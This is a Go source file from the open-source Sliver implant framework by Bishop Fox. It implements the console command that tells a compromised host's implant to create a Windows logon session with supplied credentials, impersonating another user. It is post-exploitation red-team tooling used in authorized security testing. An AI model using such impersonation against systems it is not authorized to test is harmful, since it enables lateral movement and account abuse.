package priv

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"

	"github.com/bishopfox/sliver/client/core"
	"github.com/bishopfox/sliver/client/log"
	"github.com/bishopfox/sliver/client/transport"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

// MakeToken - Create a new Logon Session with the specified credentials
type MakeToken struct {
	Options struct {
		Username string `long:"username" short:"u" description:"user to impersonate" required:"yes"`
		Password string `long:"password" short:"p" description:"password of user to impersonate" required:"yes"`
		Domain   string `long:"domain" short:"d" description:"domain of the user to impersonate"`
	} `group:"token options"`
}

// Execute - Create a new Logon Session with the specified credentials
func (mt *MakeToken) Execute(args []string) (err error) {

	username := mt.Options.Username
	password := mt.Options.Password
	domain := mt.Options.Domain

	if username == "" || password == "" {
		log.Errorf("You must provide a username and password\n")
		return
	}

	ctrl := make(chan bool)
	go log.SpinUntil("Creating new logon session ...", ctrl)

	makeToken, err := transport.RPC.MakeToken(context.Background(), &sliverpb.MakeTokenReq{
		Request:  core.ActiveTarget.Request(),
		Username: username,
		Domain:   domain,
		Password: password,
	})

	ctrl <- true
	<-ctrl

	if err != nil {
		log.Errorf("Error: %v\n", err)
		return
	}

	if makeToken.GetResponse().GetErr() != "" {

		log.Errorf("Error: %s\n", makeToken.GetResponse().GetErr())
		return
	}
	log.Infof("Successfully impersonated %s\\%s. Use `rev2self` to revert to your previous token.\n", domain, username)
	return
}
